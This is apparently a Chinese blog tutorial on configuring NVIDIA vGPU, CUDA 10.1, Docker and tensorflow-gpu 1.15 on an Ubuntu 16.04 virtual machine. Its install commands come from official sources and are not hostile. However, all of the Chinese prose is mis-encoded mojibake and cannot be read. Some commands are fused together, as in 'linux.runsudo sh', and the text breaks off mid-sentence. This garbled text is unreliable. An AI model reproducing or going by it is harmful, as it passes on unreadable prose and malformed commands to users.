vGPUï¼Œè¿™ä¸ªæ¦‚å¿µå¥½åƒæ˜¯2018å¹´æå‡ºæ¥çš„ï¼Œè¿˜ç®—æ¯”è¾ƒæ–°çš„ã€‚è€ƒè™‘åˆ°æœ‰äº›ç¨‹åºéœ€è¦åœ¨ Linux ç¯å¢ƒä¸‹è¿è¡Œï¼Œè€Œåœ¨ Windows ä¸‹ä¸€ä¸ªé€‰æ‹©æ˜¯å¼€ä¸€ä¸ªè™šæ‹Ÿæœºã€‚ä¹‹å‰è¿˜åœ¨æƒ³è™šæ‹Ÿæœºé‡Œèƒ½ä¸èƒ½ç”¨ç‹¬ç«‹æ˜¾å¡ï¼Œèƒ½å¦å®ç°åœ¨è™šæ‹Ÿæœºé‡Œè°ƒç”¨ CUDA è¿›è¡Œè®¡ç®—ã€‚vGPU çš„å‡ºç°å°±æä¾›äº†è¿™ä¸€å¯èƒ½ã€‚ vGPU å³è™šæ‹Ÿ GPUï¼Œå¯ä»¥ä¸ºæ¯ä¸ªè™šæ‹Ÿæ¡Œé¢æä¾› GPU ä½“éªŒã€‚NVIDIA è™šæ‹Ÿ GPU è½¯ä»¶ä½¿æ¯å°è™šæ‹Ÿæœºéƒ½èƒ½åƒç‰©ç†æ¡Œé¢ä¸€æ ·åˆ©ç”¨ GPUã€‚ç”±äºé€šå¸¸ç”± CPU å®Œæˆçš„å·¥ä½œå·²ç»è½¬ç§»åˆ°äº† GPUï¼Œå› æ­¤ç”¨æˆ·èƒ½å¤Ÿè·å¾—æ›´å¥½çš„ä½“éªŒï¼Œå¹¶ä¸”å¯ä»¥æ”¯æŒæ›´å¤šçš„ç”¨æˆ·ã€‚ å…¶å®æŒ‰æˆ‘çš„ç†è§£ï¼Œç®€å•æ¥è¯´å°±æ˜¯å¯¹ç‰©ç†ä¸Šçš„ GPU åšäº†è™šæ‹ŸåŒ–ï¼Œè¿™æ ·åœ¨è™šæ‹Ÿæœºä¸Šå¯ä»¥å…±äº«ä¸€ä¸ªæˆ–å¤šä¸ª GPUã€‚ä½¿ç”¨çš„æ—¶å€™å°±å’Œå¹³å¸¸ç”¨çœŸå®çš„ GPU æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚æ„Ÿè§‰è¿˜æ˜¯æŒºä¸é”™çš„ï¼Œä¸€å®šç¨‹åº¦ä¸Šæœ‰åˆ©äºèµ„æºçš„åˆç†åˆ©ç”¨å˜›ã€‚ä¸è¿‡å…·ä½“çš„åŸç†æˆ‘ä¹Ÿä¸æ¸…æ¥šå‘¢ã€‚ï¼ˆæ‚„å’ªå’ª æ›´å¤šå…³äº vGPU çš„ä¿¡æ¯å¯ä»¥å»å®˜ç½‘äº†è§£ä¸€ä¸‹ã€‚ å…¶å®ä¹‹å‰é…è¿‡ Windows ç³»ç»Ÿä¸Šçš„ GPUï¼ŒæˆåŠŸå®ç°äº†çš„ã€‚ï¼ˆç„¶è€Œä¸è®°å¾—äº†ï¼‰ ç„¶è€Œä¸Šæ¬¡é… CentOS ç³»ç»Ÿä¸Šçš„ GPUï¼Œæœ‰ç‚¹é—®é¢˜æŠ˜è…¾äº†å¥½ä¹…ä¸€ç›´éƒ½ç”¨ä¸äº†ï¼Œäºæ˜¯ä¸çŸ¥é“æ€ä¹ˆæ•´å°±ä¸€ç›´é—²ç½®ç€â€¦â€¦ æœ€è¿‘åˆ«äººå¸®å¿™æ¢äº† Ubuntu ç³»ç»Ÿï¼Œé‡æ–°é…ç½®äº†ä¸€ä¸‹ GPU èµ„æºï¼Œè£…å¥½äº†æ˜¾å¡é©±åŠ¨ã€‚ç„¶åæˆ‘æŠ˜è…¾äº†ä¸€ä¸ªä¸‹åˆï¼Œç»ˆäºåœ¨ Ubuntu 16.04 ç³»ç»Ÿä¸Šé…ç½®å¥½äº† TensorFlow çš„ vGPU ç¯å¢ƒï¼Œè¿™é‡Œæ¥åšä¸€ä¸‹ç¬”è®°å•¦ã€‚ï¼ˆä¸ç„¶è¿‡å‡ ä¸ªæœˆç”šè‡³è¿‡å‡ å¤©å°±ä¸è®°å¾—äº†å‘¢ï¼‰ ï¼ˆä»€ä¹ˆæ—¶å€™æˆè¿ç»´çš„äº†ã€‚ã€‚ å”‰ï¼Œå…¶å®æŒºéº»çƒ¦çš„ï¼Œè¿™é‡Œé¢ä¹ŸæŒºå¤šå‘çš„ï¼Œç‰¹åˆ«æ˜¯ç‰ˆæœ¬é—®é¢˜å¾ˆå®¹æ˜“å¯¼è‡´é…ç½®å¤±è´¥ã€‚è¿™é‡Œå‚è€ƒäº†æŒºå¤šç½‘ä¸Šçš„èµ„æ–™è¿˜æœ‰å‰äººåˆ†äº«çš„ç»éªŒæ•™è®­ï¼Œä»¥è½¯ä»¶é…ç½®ä¸ºä¸»ï¼Œå¤§æ¦‚åŒ…æ‹¬ä¸‹é¢å‡ ä¸ªæ­¥éª¤å§ã€‚ å®‰è£… Ubuntu è™šæ‹Ÿæœº å®‰è£… NVIDIA æ˜¾å¡é©±åŠ¨åŠæˆæƒ å®‰è£… CUDA Toolkit å®‰è£… Anaconda3 å®‰è£… tensorflow-gpu ç‰ˆæœ¬ï¼ˆåŒ…æ‹¬äº† cuDNNï¼‰ 0x01 å®‰è£…å‰å‡†å¤‡è¯·ç¡®è®¤è¦å®‰è£…çš„å„è½¯ä»¶çš„ç‰ˆæœ¬ä¹‹é—´æ˜¯å¦åŒ¹é…ï¼Œå¦‚æœä¸åŒ¹é…å¾ˆå®¹æ˜“å°±é…ç½®å¤±è´¥äº†ï¼ æˆ‘è¿™é‡Œçš„ç³»ç»Ÿæ˜¯ Ubuntu 16.04ã€‚ ï¼ˆLinuxä¸‹ï¼‰tensorflow-gpu ç‰ˆæœ¬ä¸ cuDNN åŠ CUDA ç‰ˆæœ¬å…³ç³»å¦‚ä¸‹ï¼Œæœ€æ–°ç‰ˆæœ¬åŠå…¶ä»–ç³»ç»Ÿè¯·å‚è€ƒå®˜æ–¹è¿™é‡Œã€‚ Tensorflow 2.x ç‰ˆæœ¬æŒºæ–°çš„ï¼ŒAPI ä¹Ÿæ”¹äº†ä¸å°‘ï¼Œè¿™é‡Œçœ‹1.xç‰ˆæœ¬å¥½äº†ã€‚ ç›®å‰ Tensorflow 1.x ç‰ˆæœ¬æœ€æ–°çš„æ˜¯ 1.15.0 äº†ï¼Œä¸Šé¢è¿™äº›æ˜¯ç»è¿‡æµ‹è¯•çš„æ„å»ºé…ç½®ï¼Œæ–°ç‰ˆæœ¬çš„ CUDA å’Œ cuDNN ä¸ä¿è¯ä¸€å®šèƒ½ç”¨ï¼Œä½†ä½ç‰ˆæœ¬ä¸è¡Œçš„ã€‚ç‰¹åˆ«æ˜¯ CUDA å’Œ cuDNN ç‰ˆæœ¬è¦å¯¹åº”ä¸Šã€‚ CUDA Toolkit ä¸ æ˜¾å¡é©±åŠ¨ä¹‹é—´çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼Œæœ€æ–°ç‰ˆæœ¬è¯·å‚è€ƒå®˜æ–¹è¿™é‡Œã€‚ è¿™é‡Œæ˜¯ CUDA å·¥å…·åŒ…æ‰€è¦æ±‚çš„æ˜¾å¡é©±åŠ¨çš„æœ€ä½ç‰ˆæœ¬ã€‚ ä¾‹å¦‚ TensorFlow-gpu 1.13 ä»¥ä¸Šç‰ˆæœ¬éœ€è¦ CUDA 10.0ï¼Œæ˜¾å¡é©±åŠ¨è‡³å°‘è¦ 410.48 ä»¥ä¸Šè¿™æ ·ã€‚ 0x02 å®‰è£… Ubuntu è™šæ‹Ÿæœºè¿™é‡Œæ˜¯ä»¥æœåŠ¡å™¨ä¸Šå®‰è£…ä¸ºä¾‹çš„ï¼Œæˆ‘è¿™é‡Œç°æˆé…å¥½äº†çš„ï¼Œå¤§æ¦‚å°±å‚è€ƒä¸‹é¢è¿™ä¸€ç¯‡å¥½äº†ã€‚ https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=104141 0x03 å®‰è£… NVIDIA æ˜¾å¡é©±åŠ¨åŠæˆæƒè¿™é‡Œåˆ«äººå¸®é…å¥½äº†çš„ï¼ŒåŒæ ·å‚è€ƒä¸Šé¢é‚£ä¸€ç¯‡ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹å§ï¼Œé¡ºä¾¿å€Ÿä¸€ä¸‹å›¾ã€‚ 0x03-1 å®‰è£…æ˜¾å¡é©±åŠ¨è™šæ‹Ÿæœºæ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œç„¶åä¸Šä¼ ç±»ä¼¼äº NVIDIA-Linux-x86_64-430.63-grid.run çš„æ˜¾å¡é©±åŠ¨æ–‡ä»¶ã€‚ æ³¨æ„ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬è¦æ»¡è¶³ 0x01 ä¸­çš„æ¡ä»¶ã€‚ æˆ–è€…å¯ä»¥è¿™æ ·â†“ã€‚ é¦–å…ˆæ·»åŠ æºã€‚ sudo add-apt-repository ppa:graphics-drivers/ppa sudo apt update æ£€æŸ¥å¯ä»¥å®‰è£…çš„é©±åŠ¨ç‰ˆæœ¬ï¼Œé€‰æ‹©æœ€åˆé€‚çš„ç‰ˆæœ¬å®‰è£…å³å¯ã€‚ sudo apt install nvidia-driver-XXX å®‰è£…æ˜¾å¡é©±åŠ¨çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œå…ˆæ‰§è¡Œsudo init 3 ç„¶ååœ¨é©±åŠ¨æ–‡ä»¶ç›®å½•ä¸‹æ‰§è¡Œsudo sh æ˜¾å¡é©±åŠ¨å --no-opengl-files ï¼ˆåŠ --no-opengl-filesçš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢å›¾å½¢ç•Œé¢ç™»å½•çš„æ—¶å€™å¾ªç¯è¾“å…¥å¯†ç çš„æƒ…å†µï¼‰ï¼Œç„¶åæŒ‰ç…§æç¤ºæ‰§è¡Œä¸‹ä¸€æ­¥å°±å¯ä»¥ã€‚ æ˜¾å¡å®‰è£…å®Œæˆåè¿›è¡Œæ£€æŸ¥ï¼Œ**æ‰§è¡Œnvidia-smi**ï¼Œå¦‚æœè¾“å‡ºç±»ä¼¼å¦‚ä¸‹ï¼Œåˆ™ä»£è¡¨æ˜¾å¡å®‰è£…æˆåŠŸã€‚ ç±»ä¼¼äºä¸‹é¢è¿™æ ·çš„ã€‚ï¼ˆæˆ‘è¿™é‡Œæ˜¾å¡é©±åŠ¨ç‰ˆæœ¬ä¸º 440.56ï¼‰ +-----------------------------------------------------------------------------+ | NVIDIA-SMI 440.56 Driver Version: 440.56 CUDA Version: 10.2 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | |===============================+======================+======================| | 0 GRID P100D-2Q On | 00000000:02:00.0 Off | N/A | | N/A N/A P0 N/A / N/A | 144MiB / 2032MiB | 0% Default | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: GPU Memory | | GPU PID Type Process name Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ 0x03-2 æ˜¾å¡æˆæƒä¸‹é¢è¿›è¡Œæ˜¾å¡æˆæƒçš„é…ç½®ã€‚ å¦‚æœä½¿ç”¨çš„æ˜¯åˆ‡åˆ†æ˜¾å¡ï¼Œé‚£ä¹ˆæˆæƒä¸€å®šæ˜¯ vDWS æˆæƒç±»å‹ï¼Œæ­¤å¤„éœ€è¦æå‰å…ˆéƒ¨ç½²å¥½ vGPU æˆæƒæœåŠ¡å™¨ï¼ŒæˆæƒæœåŠ¡å™¨çš„éƒ¨ç½²ï¼Œæ­¤å¤„ä¸å†èµ˜è¿°ã€‚ ç„¶åå†è™šæ‹Ÿæœºä¸­é…ç½®æˆæƒä¿¡æ¯ï¼Œæ‰§è¡Œå‘½ä»¤cd /etc/nvidiaï¼Œç„¶ålsæŸ¥çœ‹ä¼šæœ‰ä¸€ä¸ªæˆæƒæ–‡ä»¶é…ç½®æ¨¡æ¿ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤ sudo cp gridd.conf.template gridd.confã€‚ ç¼–è¾‘æˆæƒä¿¡æ¯ï¼Œæ‰§è¡Œ sudo vim gridd.confï¼Œç„¶åéœ€è¦é…ç½®ä¸‰ä¸ªåœ°æ–¹ï¼Œä¹Ÿå³æˆæƒæœåŠ¡å™¨çš„åœ°å€ã€ç«¯å£ã€ä»¥åŠæˆæƒç±»å‹ï¼Œå¡«å†™å®Œæˆä¿å­˜ä¹‹åæ‰§è¡Œå‘½ä»¤ systemctl restart nvidia-griddã€‚ è€Œååœ¨æˆæƒæœåŠ¡å™¨ç¡®è®¤è™šæ‹Ÿæœºæ˜¯å¦å·²ç»è·å–åˆ°æˆæƒã€‚ åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œä¸‹é¢çš„æ­¥éª¤å°±å’Œ vGPU æ²¡æœ‰å¾ˆå¤§çš„å…³ç³»äº†ï¼Œå°±å½“ç‰©ç†æœºä¸Šçš„çœŸå® GPU ä½¿ç”¨å°±å¥½äº†ã€‚ ä¹Ÿå°±æ˜¯è¯´ä¸‹é¢çš„æ­¥éª¤å¯¹äº Linux ä¸‹çš„ GPU ç†è®ºä¸Šéƒ½æ˜¯é€šç”¨çš„å•¦ã€‚ 0x04 åˆ©ç”¨ Docker å¿«é€Ÿå¯ç”¨ TensorFlow GPU æ”¯æŒè¿™é‡Œæ‰“æ–­ä¸€ä¸‹ï¼Œè¯´ä¸€ä¸ªå¿«é€Ÿå¯ç”¨ TensorFlow GPU æ”¯æŒçš„æ–¹æ¡ˆã€‚å¦‚æœåªæ˜¯æƒ³ä½“éªŒä¸€ä¸‹ï¼Œæˆ–è€…åœ¨ docker ä¸­æ„å»ºçš„è¯ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ï¼Œä¸éœ€è¦åé¢çš„æ­¥éª¤å°±èƒ½å¿«é€Ÿå¯ç”¨äº†ã€‚ Docker ä½¿ç”¨å®¹å™¨åˆ›å»ºè™šæ‹Ÿç¯å¢ƒï¼Œä»¥ä¾¿å°† TensorFlow å®‰è£…ç»“æœä¸ç³»ç»Ÿçš„å…¶ä½™éƒ¨åˆ†éš”ç¦»å¼€æ¥ã€‚TensorFlow ç¨‹åºåœ¨æ­¤è™šæ‹Ÿç¯å¢ƒä¸­è¿è¡Œï¼Œè¯¥ç¯å¢ƒèƒ½å¤Ÿä¸å…¶ä¸»æœºå…±äº«èµ„æºï¼ˆè®¿é—®ç›®å½•ã€ä½¿ç”¨ GPUã€è¿æ¥åˆ°äº’è”ç½‘ç­‰ï¼‰ã€‚æˆ‘ä»¬ä¼šé’ˆå¯¹æ¯ä¸ªç‰ˆæœ¬æµ‹è¯• TensorFlow Docker æ˜ åƒã€‚ Docker æ˜¯åœ¨ Linux ä¸Šå¯ç”¨ TensorFlow GPU æ”¯æŒçš„æœ€ç®€å•æ–¹æ³•ï¼Œå› ä¸ºåªéœ€åœ¨ä¸»æœºä¸Šå®‰è£… NVIDIAÂ® GPU é©±åŠ¨ç¨‹åºï¼Œè€Œä¸å¿…å®‰è£… NVIDIAÂ® CUDAÂ® å·¥å…·åŒ…ã€‚ ï¼ˆæ¥è‡ªå®˜æ–¹ Docker å®‰è£…æ•™ç¨‹ï¼‰ é¦–å…ˆï¼ˆåœ¨è™šæ‹Ÿæœºä¸Šï¼‰å®‰è£… dockerï¼Œè€Œåéœ€è¦**å®‰è£… NVIDIA Docker æ”¯æŒ**ã€‚ è¯·é€šè¿‡ docker -v æ£€æŸ¥ Docker ç‰ˆæœ¬ã€‚å¯¹äº 19.03 ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ nvidia-docker2 å’Œ --runtime=nvidia æ ‡è®°ï¼›å¯¹äº 19.03 åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œæ‚¨å°†éœ€è¦ä½¿ç”¨ nvidia-container-toolkit è½¯ä»¶åŒ…å’Œ --gpus all æ ‡è®°ã€‚ æ³¨æ„ï¼šè¯·ç¡®ä¿å·²æ­£ç¡®å®‰è£… Nvidia æ˜¾å¡é©±åŠ¨ï¼Œdocker ç‰ˆæœ¬&gt;=19.03ï¼ è¿™æ ·å°±ä¸éœ€è¦å®‰è£… CUDA toolkit äº†ã€‚ ç›®å‰æœ€æ–°çš„ docker å°±æ˜¯ 19.03.8 ç‰ˆæœ¬ï¼Œæ‰€ä»¥ç”¨nvidia-container-toolkit è½¯ä»¶åŒ…å’Œ --gpus all æ ‡è®°ã€‚ 0x04-1 å®‰è£… nvidia-container-toolkitï¼ˆUbuntu 16.04/18.04, Debian Jessie/Stretch/Busterï¼‰ # Add the package repositories distribution=$(. /etc/os-release;echo $ID$VERSION_ID) curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add - curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.list sudo apt-get update &amp;&amp; sudo apt-get install -y nvidia-container-toolkit sudo systemctl restart docker ä¹‹åå°±å¯ä»¥æµ‹è¯•ä¸€ä¸‹èƒ½å¦åœ¨dockeré‡Œè°ƒç”¨æ˜¾å¡äº†ã€‚ #### Test nvidia-smi with the latest official CUDA image docker run --gpus all nvidia/cuda:10.0-base nvidia-smi æ­£å¸¸çš„è¯æ•ˆæœä¸ nvidia-smiæ•ˆæœç›¸åŒã€‚ ä¸‹é¢è¿™å‡ ä¸ªæ˜¯æŒ‡å®šç‰¹å®šæ˜¾å¡çš„ã€‚ # Start a GPU enabled container on two GPUs docker run --gpus 2 nvidia/cuda:10.0-base nvidia-smi # Starting a GPU enabled container on specific GPUs docker run --gpus '\"device=1,2\"' nvidia/cuda:10.0-base nvidia-smi docker run --gpus '\"device=UUID-ABCDEF,1\"' nvidia/cuda:10.0-base nvidia-smi # Specifying a capability (graphics, compute, ...) for my container # Note this is rarely if ever used this way docker run --gpus all,capabilities=utility nvidia/cuda:10.0-base nvidia-smi 0x04-2 æ‹‰å– tensorflow å®˜æ–¹é•œåƒ&amp;è¿è¡Œä»£ç  æ ‡è®° è¯´æ˜ latest TensorFlow CPU äºŒè¿›åˆ¶æ˜ åƒçš„æœ€æ–°ç‰ˆæœ¬ã€‚ï¼ˆé»˜è®¤ç‰ˆæœ¬ï¼‰ nightly TensorFlow æ˜ åƒçš„æ¯å¤œç‰ˆã€‚ï¼ˆä¸ç¨³å®šï¼‰ version æŒ‡å®š TensorFlow äºŒè¿›åˆ¶æ˜ åƒçš„ç‰ˆæœ¬ï¼Œä¾‹å¦‚ï¼š2.1.0 devel TensorFlow master å¼€å‘ç¯å¢ƒçš„æ¯å¤œç‰ˆã€‚åŒ…å« TensorFlow æºä»£ç ã€‚ æ¯ä¸ªåŸºæœ¬æ ‡è®°éƒ½æœ‰ç”¨äºæ·»åŠ æˆ–æ›´æ”¹åŠŸèƒ½çš„å˜ä½“ï¼š æ ‡è®°å˜ä½“ è¯´æ˜ tag-gpu æ”¯æŒ GPU çš„æŒ‡å®šæ ‡è®°ç‰ˆæœ¬ã€‚ tag-py3 æ”¯æŒ Python 3 çš„æŒ‡å®šæ ‡è®°ç‰ˆæœ¬ã€‚ tag-jupyter å¸¦æœ‰ Jupyter çš„æŒ‡å®šæ ‡è®°ç‰ˆæœ¬ï¼ˆåŒ…å« TensorFlow æ•™ç¨‹ç¬”è®°æœ¬ï¼‰ ä¸‹è½½å¹¶è¿è¡Œæ”¯æŒ GPU çš„ TensorFlow æ˜ åƒï¼Œè€Œåè¿è¡Œè¿™è¡Œä»£ç æµ‹è¯•ä¸€ä¸‹ã€‚ docker run --gpus all -it --rm tensorflow/tensorflow:latest-gpu \\ python -c \"import tensorflow as tf; print(tf.reduce_sum(tf.random.normal([1000, 1000])))\" é•œåƒå¤§æ¦‚2ä¸ªGå§ï¼Œæ‹‰å–é•œåƒæŒºä¹…çš„â€¦â€¦ä¸Šé¢è¿™ä¸ªæ‹‰å–çš„æ˜¯æœ€æ–°ç‰ˆæœ¬çš„GPUé•œåƒã€‚å¯ä»¥é€šè¿‡ä¸Šé¢è¿™ä¸ªæµ‹è¯•ä¸€ä¸‹æ˜¯å¦å®‰è£…æˆåŠŸã€‚ä¹‹åå¯ä»¥åˆ©ç”¨docker exec é‡ç”¨å®¹å™¨ã€‚ ä½¿ç”¨æœ€æ–°çš„ TensorFlow GPU æ˜ åƒåœ¨å®¹å™¨ä¸­å¯åŠ¨ bash shell ä¼šè¯ï¼š docker run --gpus all -it tensorflow/tensorflow:latest-gpu bash è¦åœ¨å®¹å™¨å†…è¿è¡Œåœ¨ä¸»æœºä¸Šå¼€å‘çš„ TensorFlow ç¨‹åºï¼Œè¯·è£…è½½ä¸»æœºç›®å½•å¹¶æ›´æ”¹å®¹å™¨çš„å·¥ä½œç›®å½• (-v hostDir:containerDir -w workDir)ï¼š docker run --gpus all -it --rm -v $PWD:/tmp -w /tmp tensorflow/tensorflow:latest-gpu python ./script.py è¦è°ƒç”¨ GPU çš„æ—¶å€™è®°å¾—åŠ ä¸Š--gpus allæ ‡è®°å‘€ï¼ 0x05 å®‰è£… CUDA Toolkitå¦‚æœè¦ç›´æ¥ï¼ˆåœ¨è™šæ‹Ÿæœºä¸Šï¼‰è·‘ç¨‹åºçš„è¯ï¼Œéœ€è¦è£… CUDA å·¥å…·åŒ…ã€‚ è¿™ä¸€æ­¥å¾ˆå…³é”®ï¼Œæœ€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¾å¡ä¸Šæ˜¾ç¤ºäº† CUDA Version å°±è£…å¥½ CUDA äº†ï¼Œåˆ°æœ€åä¸€ç³»åˆ—è£…å®Œåœ¨ python é‡Œæµ‹è¯• GPU çš„æ—¶å€™æŠ¥é”™è¯´ tensorflow.python.framework.errors_impl.InternalError: CUDA runtime implicit initialization on GPU:0 failed. Status: all CUDA-capable devices are busy or unavailable åˆ°è°·æ­ŒæŸ¥äº†æŒºå¤šèµ„æ–™éƒ½æ²¡è§£å†³ï¼ˆä¸Šé¢è¿™ä¸ªé—®é¢˜å¯ä»¥å‚è€ƒè¿™é‡Œæœ‰ä¸€äº›å¯èƒ½çš„è§£å†³æ–¹æ¡ˆï¼‰ï¼ŒæŠ˜è…¾äº†è€åŠå¤©æ‰å‘ç°æ˜¯ CUDA Toolkit æ²¡è£…â€¦â€¦è¿˜æ˜¯åœ¨ä¸Šä¸€æ­¥ä¸­ç”¨ docker æµ‹è¯•æ‰å‘ç°çš„å‘¢ã€‚ æ‰§è¡Œ nvidia-smi å¾—åˆ°çš„CUDA Versionåº”è¯¥æ˜¯ CUDA Driver çš„ç‰ˆæœ¬ï¼Œè¿™é‡Œè¦è£…çš„ CUDA Toolkit å¯¹åº”çš„æ˜¯ Runtime version å§ï¼ˆçŒœçš„ï¼‰ã€‚ æ ¹æ® 0x01 ä¸­çš„ç‰ˆæœ¬å…³ç³»ï¼Œä»¥åŠä¸Šé¢ docker ä¸­è¿è¡Œçš„ CUDA ç‰ˆæœ¬ï¼Œè¿™é‡Œæˆ‘ç”¨äº† 10.1.243 ç‰ˆæœ¬ï¼Œå¯ä»¥åœ¨ CUDA Toolkit 10.1 update2 Archive è¿™é‡Œçœ‹ä¸‹è½½åœ°å€ã€‚ç›®å‰ä¸æ¨èç”¨æœ€æ–°çš„10.2ç‰ˆæœ¬ï¼Œå½“ç„¶éšç€å‘å±•åç»­è‚¯å®šä¼šæ›´æ–°å¦è¯´ã€‚ wget http://developer.download.nvidia.com/compute/cuda/10.1/Prod/local_installers/cuda_10.1.243_418.87.00_linux.runsudo sh cuda_10.1.243_418.87.00_linux.run è¿™é‡Œå®‰è£…ç•Œé¢æŒºæœ‰æ„æ€çš„ï¼Œå‘½ä»¤è¡Œé‡Œçš„æŠ˜å èœå•ï¼Œæƒ³ä¸åˆ°å§ï¼ æ³¨æ„ä¸€ä¸‹ï¼šè¿™é‡Œä¸è¦é€‰ Driver äº†ï¼Œåœ¨Driveré‚£é‡Œæ•²ä¸ªå›è½¦æŠŠXå»æ‰ã€‚å› ä¸ºä½ é©±åŠ¨å·²ç»è£…å¥½äº†å•¦ï¼Œè€Œä¸”æ¯”è¿™ä¸ªæ–°ã€‚ï¼ˆæˆªå›¾çš„æ—¶å€™æ²¡æœ‰å»æ‰æ‡’å¾—é‡æ–°æˆªäº†ï¼‰ å®‰è£…å®Œä¹‹åè¦æŠŠè·¯å¾„åŠ å…¥åˆ° PATH é‡Œã€‚ sudo vim ~/.bashrc åœ¨æœ€åæ–°å¢ä¸‹é¢å‡ è¡Œã€‚ # CUDA config export LD_LIBRARY_PATH=\"$LD_LIBRARY_PATH:/usr/local/cuda/lib64:/usr/local/cuda/extras/CUPTI/lib64\" export CUDA_HOME=\"/usr/local/cuda\" export PATH=\"/usr/local/cuda/bin:$PATH\" ä½¿é…ç½®ç”Ÿæ•ˆï¼ˆæˆ–é‡å¯ç»ˆç«¯ä¹Ÿè¡Œï¼‰ã€‚ source ~/.bashrc éªŒè¯ä¸€ä¸‹æœ‰æ²¡æœ‰å®‰è£…æˆåŠŸã€‚ miaotony@localhost:~# nvcc -V nvcc: NVIDIA (R) Cuda compiler driver Copyright (c) 2005-2019 NVIDIA Corporation Built on Sun_Jul_28_19:07:16_PDT_2019 Cuda compilation tools, release 10.1, V10.1.243 å¦‚æœä¸Šé¢å®‰è£…æ—¶å€™è£…äº†å®ä¾‹çš„è¯ï¼Œå¯ä»¥æ¥æµ‹è¯•ä¸€ä¸‹ã€‚ cd /usr/local/cuda/samples/1_Utilities/deviceQuery/ sudo make ./deviceQuery è¿™é‡Œå°±æ˜¾ç¤ºå‡ºäº†æ˜¾å¡çš„å„ç§å‚æ•°ï¼Œæœ€åResult=PASSåˆ™è¯´æ˜å®‰è£…æˆåŠŸäº†ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥è¯•è¯•åˆ«çš„ä¾‹å­ï¼Œå…ˆç¼–è¯‘å†æ‰§è¡Œå°±å¥½ã€‚ 0x06 å®‰è£… Anaconda3è¿™é‡Œé€‰æ‹©ç”¨ Anaconda æ¥å®‰è£…ï¼Œä¸ä»…å› ä¸ºæœ‰å¾ˆå¤šå¸¸ç”¨çš„ç§‘å­¦è®¡ç®—åº“ï¼Œè€Œä¸”åé¢ä¼šè¯´ tensorflow-gpu é‡Œè¿˜è‡ªå¸¦äº†æ»¡è¶³ç‰ˆæœ¬è¦æ±‚çš„ cuDNNã€‚ï¼ˆæˆ‘ä¹Ÿæ˜¯è¿™æ¬¡æ‰çŸ¥é“çš„å‘¢ 0x06-1 ä¸‹è½½&amp;å®‰è£…åˆ°å®˜æ–¹è¿™é‡Œä¸‹è½½ https://www.anaconda.com/products/individualã€‚ 2020.02ç‰ˆæœ¬ 64-Bit (x86) Installer (522 MB) æŒ‰ç…§æç¤ºå®‰è£…ï¼Œæœ€å¥½éƒ½è¾“å…¥yesï¼Œé‡å¯ç»ˆç«¯åä¼šè‡ªåŠ¨åˆå§‹åŒ– conda çš„é»˜è®¤ç¯å¢ƒã€‚ è¾“å…¥ conda --versionï¼Œå‡ºç°ç‰ˆæœ¬å·åˆ™å®‰è£…æˆåŠŸã€‚ 0x06-2 æ¢æºä¼—æ‰€å‘¨çŸ¥å®˜æ–¹çš„ conda æºé€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œæ¢æ¸…å tuna æºå§ã€‚ ï¼ˆè®°å¾—æœ‰æ®µæ—¶é—´å› ä¸ºç‰ˆæƒé—®é¢˜ tuna é•œåƒè¿˜ä¸­æ–­è¿‡ä¸€é˜µå­ï¼Œåæ¥æ”¾å¼€äº†ï¼‰ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ conda config --set show_channel_urls yes 0x07 å®‰è£… tensorflow-gpu ï¼ˆåŒ…æ‹¬ cuDNNï¼‰0x07-1 æ–°å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼ˆå¯é€‰çš„å•¦ï¼‰åä¸ºtensorflowï¼ŒæŒ‡å®š python ç‰ˆæœ¬ä¸º3.6ã€‚ï¼ˆè¿™ä¸ªçœ‹ä¸ªäººä»¥åŠéœ€æ±‚å§ï¼‰ conda create -n tensorflow python=3.6 å¯èƒ½éœ€è¦ç¡®è®¤å°±å›è½¦æˆ–è€…è¾“å…¥yå®Œäº‹ã€‚ 0x07-2 å®‰è£… tensorflow-gpué¦–å…ˆæŸ¥ä¸€ä¸‹å½“å‰ç¯å¢ƒä¸‹æ”¯æŒçš„ç‰ˆæœ¬ã€‚ conda search tensorflow-gpu æ³¨æ„ä¸€ä¸‹é©±åŠ¨çš„ç‰ˆæœ¬é—®é¢˜ï¼Œå¯¹äºæ–°çš„tfç‰ˆæœ¬ï¼Œé©±åŠ¨å¯èƒ½ä¸æ”¯æŒã€‚ æ¯”å¦‚è£…1.15.0ç‰ˆæœ¬ã€‚ conda install tensorflow-gpu==1.15.0 å¤§æ¦‚å…­ä¸ƒç™¾MBçš„äºšå­ï¼Œç½‘ç»œä¸æ˜¯å¾ˆç¨³å®šï¼Œå¤§æ¦‚ç‡éœ€è¦é‡è¯•å‡ æ¬¡æ‰è¡Œã€‚ 0x07-3 éªŒè¯å®‰è£…å®‰è£…å®Œæˆåï¼Œè¿›å…¥pythonè¯•ä¸€è¯•å‘—ã€‚ import tensorflow as tf print(tf.test.is_gpu_available()) æ˜¾ç¤ºä¸ºTrueåˆ™è¡¨ç¤ºä»¥ä¸Šå®‰è£…æˆåŠŸäº†ï¼ ï¼ˆtf 